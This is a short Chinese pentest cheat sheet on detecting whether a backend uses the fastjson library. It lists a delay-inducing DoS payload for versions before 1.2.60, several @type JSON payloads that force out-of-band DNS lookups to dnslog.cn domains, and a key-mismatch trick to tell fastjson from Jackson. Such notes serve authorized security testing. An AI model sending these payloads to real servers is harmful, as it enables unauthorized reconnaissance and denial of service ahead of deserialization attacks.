# 有错误回显

构造不规范的JSON字符串查看返回报错

# 无错误回显

## DOS延迟判断
fastjson在版本<1.2.60在取不到值的时候会填充\u001a，发生DOS，我们可以构造请求，通过响应延迟来判断是否使用的fastjson

使用 `{"a":"\x ` 作为payload发送至服务器，依靠延迟判断。如果是符合的版本(<1.2.60)，延迟会明显增大。

## DNS回显判断
通过DNS回显的方式检测后端是否使用的fastjson

```json
{"@type":"java.net.Inet4Address","val":"dnslog"}
{"@type":"java.net.Inet6Address","val":"dnslog"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"dnslog"}}""}
{{"@type":"java.net.URL","val":"dnslog"}:"aaa"}
Set[{"@type":"java.net.URL","val":"dnslog"}]
Set[{"@type":"java.net.URL","val":"dnslog"}
{{"@type":"java.net.URL","val":"dnslog"}:0
```

# 判断是fastjson还是jackson
Jackson相对比较严格，强制key和javabean属性对齐，只能少不能多key

fastjson多key不会报错，我们可以多构造一个，因此大概率判断为fastjson（没有其它json解析库的情况下）


{"@type":"java.net.Inet4Address","val":"wp7w20.dnslog.cn"}
{"@type":"java.net.Inet6Address","val":"9a9h3k.dnslog.cn"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"9a9h3k.dnslog.cn"}}
{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"9a9h3k.dnslog.cn"}}""}
{{"@type":"java.net.URL","val":"9a9h3k.dnslog.cn"}:"aaa"}
Set[{"@type":"java.net.URL","val":"9a9h3k.dnslog.cn"}]
Set[{"@type":"java.net.URL","val":"9a9h3k.dnslog.cn"}
{{"@type":"java.net.URL","val":"dns9a9h3k.dnslog.cnlog"}:0